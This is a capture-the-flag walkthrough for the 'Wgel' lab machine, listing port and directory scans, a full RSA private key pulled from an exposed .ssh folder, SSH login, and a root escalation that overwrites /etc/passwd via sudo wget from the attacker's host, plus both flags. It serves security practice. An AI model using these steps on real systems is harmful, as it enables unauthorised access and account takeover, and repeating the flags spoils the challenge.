# Wgel CTF

## User flag

- Scan Ports
    
    ```bash
    sudo nmap -n -sV -A -O 10.10.173.225
    ```
    
    > PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
    |   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
    |_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    > 
- On the first page, in the source code
    
    ```bash
    <!-- Jessie don't forget to udate the webiste -->
    ```
    
- Scan directorys web
    
    ```bash
    gobuster -u 10.10.173.225 -w wordlist/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,txt
    ```
    
    > /index.html (Status: 200)
    /sitemap (Status: 301)
    > 
- More scan
    
    ```bash
    dirb
    gobuster -u 10.10.173.225/sitemap -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,txt
    ```
    
- strangely appears a `.ssh`
- `10.10.173.225/sitemap/.ssh`
- `http://10.10.173.225/sitemap/.ssh/id_rsa`
- Copy this file
    
    ```bash
    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
    m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
    W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
    y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
    +J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
    Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
    /1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
    AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
    M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
    SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
    2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
    p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
    7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
    dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
    GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
    shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
    uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
    LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
    QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
    V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
    hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
    9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
    eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
    QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
    jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
    -----END RSA PRIVATE KEY-----
    
    ```
    
- With this we can enter the SSH
    
    ```bash
    ssh -i key jessie@10.10.173.225
    ```
    
- Search the `User flag`
    
    ```bash
    ls
    ls /home
    ls /home/jessie
    ls /home/jessie/Documents/
    cat /home/jessie/Documents/user_flag.txt
    ```
    
- `057c67131c3d5e42dd5cd3075b198ff6`

## Root flag

```bash
sudo -l -l
```

- We have the `wget`
    - [https://gtfobins.github.io/gtfobins/wget/#file-download](https://gtfobins.github.io/gtfobins/wget/#file-download)
- Read the passwd
    
    ```bash
    cat /etc/passwd
    ```
    
- Copy this for our computer
- Let's encrypt a password of ours to replace with the contents of the root and jessie password
    
    ```bash
    python
    import crypt
    crypt.crypt("senha")
    $6$0/rQlegVhcHrEW3U$Vip/r0HdRYNgIO3uhlLYD2Y9Jdy7FD4WwcLzr6T0COV5/vB3meDqXqh0hRvVLZrmqQKGiag0X4fwtdTdec44t0
    ```
    
- Move this to the root's and Jessie's password
    - `$6$0/rQlegVhcHrEW3U$Vip/r0HdRYNgIO3uhlLYD2Y9Jdy7FD4WwcLzr6T0COV5/vB3meDqXqh0hRvVLZrmqQKGiag0X4fwtdTdec44t0`
    
    ![Untitled](Untitled.png)
    
- Move this content to `/var/www/html`
    
    ```bash
    sudo mv passwd /var/www/html
    service apache2 start
    ifconfig
    ```
    
- On Jessie’ computer
    - [https://gtfobins.github.io/gtfobins/wget/#file-download](https://gtfobins.github.io/gtfobins/wget/#file-download)
    
    ```bash
    sudo wget 10.8.154.250/passwd -O /etc/passwd
    sudo su
    senha
    whoami
    cd /root
    cat *
    ```
    
- `b1b968b37519ad1daa6408188649263d`